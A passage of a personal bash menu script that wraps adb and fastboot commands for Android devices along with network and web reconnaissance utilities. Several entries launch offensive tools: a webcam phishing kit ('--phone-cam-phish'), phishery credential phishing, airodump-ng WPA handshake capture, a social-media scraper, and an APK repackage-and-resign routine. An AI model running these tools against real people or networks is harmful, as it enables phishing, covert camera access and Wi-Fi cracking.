              	shift
              	cd /home/snuff/Desktop/MENU/MODULES/android/platform-tools/
              	METHOD=$(zenity --entry --text="enter method: LIST_DEVICES | GET_VARS | HELP | REBOOT_RECOVERY | REBOOT_BOOTLOADER | FLASH_BOOT | FLASH_RECOVERY")
              	if [[ "$METHOD" = "LIST_DEVICES" ]]; then
		fastboot devices -l
              	fi 
              	if [[ "$METHOD" = "HELP" ]]; then
              	fastboot --help
              	fi
              	if [[ "$METHOD" = "GET_VARS" ]]; then
                fastboot getvar all
              	fi
              	if [[ "$METHOD" = "REBOOT_RECOVERY" ]]; then
		fastboot reboot recovery
              	fi 
              	if [[ "$METHOD" = "REBOOT_BOOTLOADER" ]]; then
		fastboot reboot bootloader
              	fi 
              	if [[ "$METHOD" = "FLASH_BOOT" ]]; then
              	read -p "path to .img:" IMG
		fastboot flash boot $IMG
              	fi
              	if [[ "$METHOD" = "FLASH_RECOVERY" ]]; then
              	read -p "path to .img:" IMG
              	fastboot flash recovery $IMG
              	fi            	              	             	              	             	              	              	                
              	shift
              	;;
              --adb-lp)
              	shift
              	$ADB shell pm list packages
              	shift
              	;;
              --adb-wm)
              	shift
              	read -p "enter size" SIZE
              	$ADB shell wm density $SIZE
              	shift
              	;;
              --adb-pair)
              	shift
              	IP=$(zenity --entry --text="enter ip address")
              	PORT=$(zenity --entry --text="enter PORT")
              	PAIR=$(zenity --entry --text="enter pairing CODE")
		$ADB pair $IP:$PORT $PAIR
              	shift
              	;;
              --adb-set-batt)
              	shift
              	LVL=$(zenity --entry --text="what percent to set battery")
              	$ADB shell dumpsys battery set level $LVL	              	
              	shift
              	;;
              --adb-con-tcp)
              	shift
              	IP=$(zenity --entry --text="enter ip address")
              	PORT=$(zenity --entry --text="enter PORT")
		$ADB connect $IP:$PORT
              	shift
              	;;
              --adb-list-dev)
              	shift
		$ADB devices -l              	
              	shift
              	;;
              --adb-ss)
              	shift
		$ADB start-server              	
              	shift
              	;;
              --adb-sts)
              	shift
		$ADB kill-server              	
              	shift
              	;;
              --adb-usb)
              	shift
		$ADB usb              	
              	shift
              	;;
              --adb-help)
              	shift
              	$ADB --help              	
              	shift
              	;;
              --adb-call)
              	shift
		NUM=$(zenity --entry --text="ENTER PHONE NUMBER")
		$ADB shell am start -a android.intent.action.CALL -d tel:+$NUM // Make a call              	              	
              	shift
              	;;
              --adb-send-text)
              	shift
		NUM=$(zenity --entry --text="ENTER PHONE NUMBER")
		TEXT=$(zenity --entry --text="ENTER TEXT TO SEND")
		$ADB shell am start -a android.intent.action.SENDTO -d sms:+$NUM--es  sms_body "$TEXT" --ez exit_on_sent false              	              	
              	shift
              	;; 
              --adb-home-buttom)
              	shift
		$ADB shell am start -W -c android.intent.category.HOME -a android.intent.action.MAIN              	              	
              	shift
              	;; 
              --adb-reset-perm)
              	shift
		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
		$ADB shell pm reset-permissions -p $PACK              	              	
              	shift
              	;; 
              --adb-grant-perm)
              	shift
		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
		PERMISSION=$(zenity --entry --text="ENTER PERMSISSION TO GRANT")
		$ADB shell pm grant $PACK $PERMISSION              	              	
              	shift
              	;; 
              --adb-revoke-perm)
              	shift
		PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
		PERMISSION=$(zenity --entry --text="ENTER PERMSISSION TO REVOKE")
		$ADB shell pm revoke $PACK $PERMISSION              	              	
              	shift
              	;; 
              --adb-bright-up)
              	shift
		$ADB shell input keyevent 221              	              	
              	shift
              	;; 
              --adb-bright-down)
              	shift
		$ADB shell input keyevent 220              	              	
              	shift
              	;; 
              --adb-contacts)
              	shift
		$ADB shell input keyevent 207              	              	
              	shift
              	;; 
              --adb-open-cam)
              	shift
		$ADB shell input keyevent 27              	              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-print-text)
              	shift
		TEXT=$(zenity --entry --text="ENTER TEXT TO PRINT")
		$ADB shell input text "$TEXT"              	              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-hit-enter)
              	shift
              	$ADB shell input keyevent 66              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-open-web)
              	shift
              	$ADB shell input keyevent 64              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-unin)
              	shift
              	PACK=$(zenity --entry --text="ENTER PACKAGE NAME EX: com.some.package")
		$ADB shell pm uninstall --user 0 $PACK          	              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-reboot-rec)
              	shift
              	$ADB reboot-recovery              	
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-reboot-bootloader)
              	shift
		$ADB reboot fastboot
		$ADB reboot-bootloader
              	shift
              	;;               	              	              	              	              	              	              	              	                          --adb-bkup-all)
              	shift
              	$ADB backup -shared -apk -all -f backup.ab              	
              	shift
              	;;               	              	              	              	              	              	              	              	              	            	            	            	           	            	            	            	            	
              --add-vlan)
              	shift
		IP=$(zenity --entry --text="enter ip address to create for vlan")              	
              	IFACE=$(zenity --entry --text="enter iface")
              	VLANID=$(zenity --entry --text="enter vlan id ex: 10")
              	vconfig add $IFACE $VLANID
		ifconfig $IFACE.$VLANID $IP/24 up
              	shift
              	;;
              --adb-service-list)
              	shift
              	$ADB shell service list
              	shift
              	;;
	      --adb-list-phone-feat)
	      	shift
	      	$ADB shell pm list features
	      	shift
	      	;;
	      --system-log)
	      	shift
	      	dmesg -H --reltime --follow-new 
	      	shift
	      	;;
	      --lazy-script)
	      	shift
	      	cd /home/snuff/Desktop/MENU/MODULES/lscript-master && bash ./l
	      	shift
	      	;;
	      --phone-cam-phish)
	      	shift
	      	cd /home/snuff/Desktop/MENU/MODULES/WcamPhish-main/ && bash wcamphish.sh
	      	shift
	      	;;
	      --apk-file-edit-sign)
	      	shift
		apktool decode base.apk -o decoded
		apktool build -f decoded -o repackaged.apk
		zipalign -v 4 repackaged.apk

		zipalign -c -v 4 repackaged.apk
		keytool -genkey -keyalg RSA -validity 365 -keysize 2048 -storetype PKCS12 -alias apk_rsa_priv -keystore apk_rsa_priv.key -storepass 12345678
		apksigner sign --ks apk_rsa_priv.key --ks-pass "pass:12345678" repackaged.apk
		jarsigner -sigalg SHA256withRSA -digestalg SHA-256 -tsa http://timestamp.digicert.com -keystore apk_rsa_priv.key -storepass 12345678 repackaged.apk apk_rsa_priv
		apksigner verify repackaged.apk
		jarsigner -verify -verbose -certs repackaged.apk	      	
	      	shift
	      	;;
	      --social-media-scrape-gui)
	      	shift
	      	cd /home/snuff/Desktop/MENU/MODULES/reaper/ && python3 reaper.py
	      	shift
	      	;;
	      --wpa-handshake)
	      	shift
	      	CH=$(zenity --entry --text="channel number")    
	      	          	
	      	airodump-ng wlan0mon --channel $CH -w /home/snuff/Desktop/MENU/LOGS/airodump_essid_results --essid $SSID --bssid FF:FF:FF:FF:FF:FF
	      	shift
	      	;;
	      --top-links)
	      	shift
	      	echo ' https://www.gl.com/maps-sigtran.html
	      	     
		       https://www.webcrawler.com/
		       https://www.etools.ch/'
	      	shift
	      	;;
	      --grab-ssl)
	      	shift
	        DOM=$(zenity --entry --text="ENTER DOMAIN")    
	      	keytool -printcert -rfc -sslserver $DOM
	      	openssl x509 -noout -text -in $DOM
	      	shift
	      	;;
	      --extract-web-info)
	      	shift
	        DOM=$(zenity --entry --text="ENTER DOMAIN")    	      	
	      	urlextractor $DOM
	      	shift
	      	;;
	      --phishery)
	      	shift
	      	phishery
	      	shift
	      	;;
	      --hakrawler)
	      	shift
	      	touch /home/snuff/Desktop/urls.txt
	      	mousepad /home/snuff/Desktop/urls.txt
	      	cat urls.txt | hakrawler
	      	shift
	      	;;
	      --url-watch-4-changes)
	      	shift
		mousepad /home/snuff/Desktop/MENU/MODULES/urlwatch.txt
		urlwatch --urls /home/snuff/Desktop/MENU/MODULES/urlwatch.txt	      	
	      	shift
	      	;;
              	 *)
                echo  "Invalid parameter:" 1>&2
                exit 1
                ;;
        esac
    done
}               
parse_user_options "$@"
